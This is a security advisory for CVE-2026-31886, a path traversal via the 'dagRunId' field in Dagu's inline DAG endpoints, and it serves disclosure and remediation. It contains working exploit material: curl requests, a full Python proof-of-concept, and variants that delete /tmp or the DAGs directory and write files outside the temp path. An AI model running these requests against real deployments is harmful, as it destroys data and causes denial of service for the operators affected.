# [C] Dagu: Path Traversal via `dagRunId` in Inline DAG Execution

## Summary
Severity: Critical
Advisory: GHSA-m4q3-457p-hh2x
CVE: CVE-2026-31886
CWE: CWE-22
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:H (CVSS_V3)
Published: 2026-03-13
Source: https://github.com/advisories/GHSA-m4q3-457p-hh2x
Type: github-advisory

## Affected
- Go: `github.com/dagu-org/dagu` — affected >=0

## Details
## 1. Vulnerability Summary

The `dagRunId` request field accepted by the inline DAG execution endpoints is passed directly into `filepath.Join` to construct a temporary directory path without any format validation. Go's `filepath.Join` resolves `..` segments lexically, so a caller can supply a value such as `".."` to redirect the computed directory outside the intended `/tmp/<name>/<id>` path. A deferred cleanup function that calls `os.RemoveAll` on that directory then runs unconditionally when the HTTP handler returns, deleting whatever directory the traversal resolved to.

With `dagRunId` set to `".."`, the resolved directory is the system temporary directory (`/tmp` on Linux). On non-root deployments, `os.RemoveAll("/tmp")` removes all files in `/tmp` owned by the dagu process user, disrupting every concurrent dagu run that has live temp files. On root or Docker deployments, the call removes the entire contents of `/tmp`, causing a system-wide denial of service.


## 2. This Is Not a Duplicate of Existing Advisories

Two security advisories are already published for dagu. This vulnerability is distinct from both.

**GHSA-6qr9-g2xw-cw92** fixed the fact that the default authentication mode was `none`, allowing unauthenticated access to the inline execution endpoint. That advisory covers authentication bypass. The `dagRunId` path traversal described here is a separate input-validation flaw in `loadInlineDAG()` that exists regardless of whether authentication is required and was not addressed by that fix.

**CVE-2026-27598** fixed a path traversal in the DAG creation endpoint (`POST /api/v1/dags`) via the `name` field. The fix added `filepath.Base()` and a base-directory prefix check inside `generateFilePath()`. That fix applies only to `generateFilePath()` in `dags.go`. The function `loadInlineDAG()` in `dagruns.go` has no equivalent guard on its `dagRunID` argument and was not part of that patch.


## 3. Vulnerable Code

**File**: `internal/service/frontend/api/v1/dagruns.go`

The `loadInlineDAG` function (lines 202-267) constructs the temp directory at line 234:

```go
tmpDir := filepath.Join(os.TempDir(), nameHint, dagRunID)
```

`dagRunID` is user-supplied. No validation of the value occurs before this line. The cleanup closure is then registered:

```go
cleanup := func() {
    _ = os.RemoveAll(tmpDir)
}
```

In `ExecuteDAGRunFromSpec` (lines 52-119), the cleanup is deferred unconditionally:

```go
dag, cleanup, err := a.loadInlineDAG(ctx, request.Body.Spec, request.Body.Name, dagRunId)
if err != nil {
    return nil, err
}
defer cleanup()  // registered after loadInlineDAG succeeds; fires on all subsequent return paths
```

The same pattern appears in `EnqueueDAGRunFromSpec` (lines 122-200), line 160:

```go
defer cleanup()
```

**Why the OpenAPI schema pattern does not prevent this:**

The `DAGRunId` schema in `api/v1/api.yaml` (line 5738) declares:

```yaml
pattern: "^[a-zA-Z0-9_-]+$"
```

This pattern excludes `.` and `/`, which would block path traversal values. However, enforcement of that pattern depends on the OpenAPI validator middleware, which is only activated when `StrictValidation` is `true`. That setting is defined in `internal/cmn/config/config.go`:

```go
StrictValidation  bool
```

It is not present in the `Definition` struct (`definition.go`) and carries no `mapstructure` tag, which means viper/mapstructure can never populate it from a YAML configuration file; it therefore cannot be set in the config loader (`loader.go`) and its value is always the Go zero value for `bool`, which is `false`. The loader test at line 165 of `loader_test.go` confirms that `StrictValidation` is `false` even after loading a comprehensive configuration file that exercises every configurable option — because there is no mechanism by which it could ever be `true`. The validator middleware is never registered for any standard dagu deployment.

The file `dagruns.go` defines a `sanitizeFilename` helper at line 36 that replaces characters outside `[a-zA-Z0-9._-]` with underscores. This function is called when constructing log filenames (lines 422, 566, 1127, and 1211) and is never applied to `dagRunID` before the `filepath.Join` call. No validation or sanitization of `dagRunID` for path separator characters exists anywhere in the request-to-`filepath.Join` pipeline.


## 4. Attack Conditions

- The attacker must be authenticated with a role of `operator`, `developer`, `manager`, or `admin` (any role for which `CanExecute()` returns true).
- The server permission `PermissionRunDAGs` must be enabled. This is the default (`true` as set in `loader.go` lines 353-356).
- On dagu versions 1.30.3 and earlier, where the default authentication mode was `none`, no authentication is required at all.


## 5. Attack Scenario

### Step 1: Authenticate

```bash
TOKEN=$(curl -s -X POST http://TARGET:8080/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"operator","password":"<password>"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

For versions with `auth.mode: none`, authentication is not required and the `Authorization` header can be omitted.

### Step 2: Send the malicious request

```bash
curl -s -X POST http://TARGET:8080/api/v1/dag-runs \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "spec": "steps:\n  - name: s\n    command: id\n",
    "dagRunId": ".."
  }'
```

### Step 3: What happens inside the server

1. `request.Body.DagRunId` is `".."`. This value is copied to `dagRunId` at line 72 without modification.

2. `loadInlineDAG` is called with `dagRunID = ".."` and no `name` parameter, so `nameHint = "inline"`. Because `name` is nil, the `else` branch at lines 214-231 runs first: `spec.LoadYAML` parses the spec content and `dag.Validate()` checks its structure. This pre-validation operates entirely on the YAML content; it has no knowledge of `dagRunID`. The exploit spec (`steps:\n  - name: s\n    command: id\n`) passes this check. The `nameHint` variable is not updated by this parse — it stays `"inline"` regardless of any `name` field inside the spec YAML. Control reaches line 234 only after the spec is accepted.

3. Line 234 executes:
   ```
   tmpDir = filepath.Join("/tmp", "inline", "..")
           = filepath.Clean("/tmp/inline/..")
           = "/tmp"
   ```
   (`filepath.Join` calls `filepath.Clean` on the joined result, resolving `..` lexically.)

4. `os.MkdirAll("/tmp", 0o750)` succeeds because `/tmp` already exists.

5. The cleanup closure captures `tmpDir = "/tmp"`:
   ```go
   cleanup = func() { os.RemoveAll("/tmp") }
   ```

6. The spec is written to `filepath.Join("/tmp", "inline.yaml")` = `/tmp/inline.yaml` and loaded via `spec.Load` (line 256). The load succeeds.

7. `loadInlineDAG` returns `dag, cleanup, nil`.

8. `defer cleanup()` is registered in `ExecuteDAGRunFromSpec`.

9. The handler builds the 200 response object. In Go, deferred functions execute during the function's return sequence — before control returns to chi's server wrapper. The deferred cleanup therefore fires first: `os.RemoveAll("/tmp")` runs and removes the target directory.

10. The handler returns the response object to chi. Chi serializes it and sends the HTTP 200 to the client. The 200 is delivered successfully because the response content was already constructed before the defer ran; the directory deletion does not affect the HTTP response.

### Step 4: Result

On non-root deployments: all files in `/tmp` owned by the dagu process user are removed (Linux sticky bit prevents deletion of files owned by other users). Any concurrent dagu runs that have live temp files in `/tmp` lose those files and fail.

On root or Docker deployments (where dagu runs as root inside a container, which is a common production pattern): all contents of `/tmp` are removed, affecting every process on the system that uses `/tmp` for temporary storage.

The attack can be sent repeatedly without any cooldown, maintaining the denial-of-service condition.


## 6. Proof of Concept

### One-liner (against auth-mode-none instance)

```bash
curl -s -X POST http://localhost:8080/api/v1/dag-runs \
  -H "Content-Type: application/json" \
  -d '{"spec":"steps:\n  - name: s\n    command: id\n","dagRunId":".."}'
```

### Automated PoC script

Save as `poc.py` and run with `python3 poc.py`:

```python
#!/usr/bin/env python3
"""
Proof of Concept: dagu dagRunId path traversal
Affected: POST /api/v1/dag-runs  (executeDAGRunFromSpec)
          POST /api/v1/dag-runs/enqueue  (enqueueDAGRunFromSpec)

Vulnerable line: dagruns.go:234
  tmpDir := filepath.Join(os.TempDir(), nameHint, dagRunID)

Usage:
  python3 poc.py --url http://localhost:8080
  python3 poc.py --url http://localhost:8080 --username admin --password secret
  python3 poc.py --url http://localhost:8080 --token eyJ...
"""

import argparse
import json
import os
import sys
import time
import urllib.request
import urllib.error


def login(base_url, username, password):
    payload = json.dumps({"username": username, "password": password}).encode()
    req = urllib.request.Request(
        f"{base_url}/api/v1/auth/login",
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read())
            token = data.get("token") or data.get("accessToken")
            if not token:
                print(f"Login response did not contain a token: {data}")
                sys.exit(1)
            return token
    except urllib.error.HTTPError as e:
        print(f"Login failed (HTTP {e.code}): {e.read().decode()}")
        sys.exit(1)


def send_exploit(base_url, token, traversal):
    body = json.dumps({
        "spec": "steps:\n  - name: s\n    command: id\n",
        "dagRunId": traversal,
    }).encode()
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(
        f"{base_url}/api/v1/dag-runs",
        data=body,
        headers=headers,
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://localhost:8080")
    parser.add_argument("--token", default="")
    parser.add_argument("--username", default="admin")
    parser.add_argument("--password", default="")
    parser.add_argument("--traversal", default="..",
                        help="Value for dagRunId (default: '..')")
    args = parser.parse_args()

    base_url = args.url.rstrip("/")
    traversal = args.traversal

    import posixpath
    name_hint = "inline"
    expected_dir = posixpath.normpath(f"/tmp/{name_hint}/{traversal}")
    print(f"Target server : {base_url}")
    print(f"dagRunId value: {repr(traversal)}")
    print(f"Resolved tmpDir (Linux): filepath.Join('/tmp', '{name_hint}', '{traversal}') = '{expected_dir}'")
    print(f"os.RemoveAll will target: '{expected_dir}'")
    print()

    token = args.token
    if not token and args.password:
        print("Obtaining JWT token...")
        token = login(base_url, args.username, args.password)
        print(f"Token obtained: {token[:30]}...")
    elif not token:
        print("No token provided. Proceeding without authentication (requires auth.mode: none).")
    print()

    tmp_before = os.path.exists(expected_dir) if os.path.isabs(expected_dir) else None
    if tmp_before is not None:
        print(f"'{expected_dir}' exists before request: {tmp_before}")

    print(f"Sending request to {base_url}/api/v1/dag-runs ...")
    status, body = send_exploit(base_url, token, traversal)
    print(f"HTTP {status}: {body}")
    print()

    if status not in (200, 201):
        print(f"Unexpected status {status}. Check credentials or server configuration.")
        sys.exit(1)

    time.sleep(0.5)

    if tmp_before is not None:
        tmp_after = os.path.exists(expected_dir)
        print(f"'{expected_dir}' exists after request: {tmp_after}")
        if not tmp_after:
            print()
            print("CONFIRMED: path traversal caused os.RemoveAll to delete the target directory.")
        else:
            print()
            print("Directory still exists. If running against a remote server, check")
            print(f"on the server host whether '{expected_dir}' was modified.")
    else:
        print(f"Cannot verify filesystem state from this host.")
        print(f"On the server, check whether '{expected_dir}' was modified after the request.")


if __name__ == "__main__":
    main()
```

### Local test setup (no existing dagu installation needed)

```bash
# Download the latest dagu binary
curl -L https://github.com/dagu-org/dagu/releases/latest/download/dagu_linux_amd64.tar.gz \
  | tar -xz

# Start with no authentication for simplest reproduction
cat > /tmp/dagu-test.yaml <<'EOF'
auth:
  mode: none
EOF

./dagu server --config /tmp/dagu-test.yaml &
SERVER_PID=$!
sleep 2

# Confirm /tmp is accessible
echo "Files in /tmp before: $(ls /tmp | wc -l)"

# Run the exploit
curl -s -X POST http://localhost:8080/api/v1/dag-runs \
  -H "Content-Type: application/json" \
  -d '{"spec":"steps:\n  - name: s\n    command: id\n","dagRunId":".."}'

sleep 1

# Check whether dagu-owned temp files were deleted
echo "Files in /tmp after:  $(ls /tmp | wc -l)"

kill $SERVER_PID
```

### Variant: target the enqueue endpoint

Both endpoints are affected via the same `loadInlineDAG` call:

```bash
curl -s -X POST http://TARGET:8080/api/v1/dag-runs/enqueue \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"spec":"steps:\n  - name: s\n    command: id\n","dagRunId":".."}'
```

### Variant: file write outside /tmp

With a `dagRunId` value that traverses to a known writable directory, the spec content is written there as `<nameHint>.yaml` before the cleanup removes that directory:

```json
{
  "spec": "steps:\n  - name: s\n    command: id\n",
  "name": "payload",
  "dagRunId": "../../home/dagu/dags"
}
```

This writes `/home/dagu/dags/payload.yaml`, executes it, then calls `os.RemoveAll("/home/dagu/dags")`, deleting the entire DAGs directory. The exact path depends on the deployment but can be inferred from error messages or default paths.


## 7. Impact

**Denial of Service (primary)**

On every deployment, an authenticated operator can send one request to trigger `os.RemoveAll` on a directory outside the intended temp subdirectory. With `dagRunId=".."`, the target is `/tmp`. On a non-root deployment with Linux sticky bit semantics, all temp files in `/tmp` created by the dagu user are deleted. Any running dagu workflow that depends on temp files in progress is interrupted. The attack can be repeated continuously with no rate limiting, preventing recovery.

On Docker-based deployments where dagu runs as root inside a container (a common pattern for dagu installations), `os.RemoveAll("/tmp")` removes all contents of `/tmp` inside the container. This affects every process in the container that uses `/tmp`, including shared libraries unpacked at runtime, unix sockets, and lock files.

**Arbitrary file write (secondary)**

The spec YAML content provided by the attacker is written to `filepath.Join(tmpDir, nameHint+".yaml")` where both `tmpDir` and `nameHint` can be influenced. If the attacker knows or can guess the path of a directory writable by the dagu process (for example, the DAGs directory), they can write arbitrary YAML content there. Because `spec.Load` reads from that path and executes the spec, this also provides a mechanism for persisting a workflow definition containing attacker-controlled commands in the DAGs directory before the cleanup removes it.

**Deletion of the DAGs directory (combined)**

The combination of the file write and the cleanup allows an authenticated operator to permanently delete the entire DAGs directory in a single request by pointing `dagRunId` at that path. This destroys all workflow definitions for all users of the dagu instance.


## 8. Affected Versions

The `loadInlineDAG` function and both calling handlers (`ExecuteDAGRunFromSpec` and `EnqueueDAGRunFromSpec`) are present in the current `main` branch. The vulnerability has existed since these endpoints were introduced. No fix is present as of the review date of 2026-02-24.

Authentication requirements differ by version:
- Versions 1.30.3 and earlier: default `auth.mode` was `none`, so this is exploitable without credentials
- Versions after 1.30.3: default `auth.mode` is `builtin`, so operator-level credentials are required


## 9. Recommended Fix

Validate `dagRunID` before use in `loadInlineDAG`. The OpenAPI schema already defines the correct pattern. Enforce it at the application layer:

```go
// Add at the start of loadInlineDAG, before filepath.Join:
var validDAGRunID = regexp.MustCompile(`^[a-zA-Z0-9_-]+$`)

if dagRunID != "" && !validDAGRunID.MatchString(dagRunID) {
    return nil, func() {}, &Error{
        HTTPStatus: http.StatusBadRequest,
        Code:       api.ErrorCodeBadRequest,
        Message:    "dagRunId contains invalid characters",
    }
}
```

As a defense-in-depth measure, verify that the resolved `tmpDir` is actually inside the expected base after joining:

```go
tmpDir := filepath.Join(os.TempDir(), nameHint, dagRunID)
expectedBase := filepath.Join(os.TempDir(), nameHint)
if !strings.HasPrefix(tmpDir+string(filepath.Separator), expectedBase+string(filepath.Separator)) {
    return nil, func() {}, &Error{
        HTTPStatus: http.StatusBadRequest,
        Code:       api.ErrorCodeBadRequest,
        Message:    "dagRunId resolves outside the permitted temp directory",
    }
}
```

The same fix must be applied to both `ExecuteDAGRunFromSpec` and `EnqueueDAGRunFromSpec`. Additionally, enabling `StrictValidation: true` as the default configuration would provide an extra layer of enforcement at the API boundary.

## References
- https://github.com/dagu-org/dagu/security/advisories/GHSA-m4q3-457p-hh2x
- https://nvd.nist.gov/vuln/detail/CVE-2026-31886
- https://github.com/dagu-org/dagu/commit/12c2e5395bd9331d49ca103593edfd0db39c4f38
- https://github.com/dagu-org/dagu
- https://pkg.go.dev/vuln/GO-2026-4693
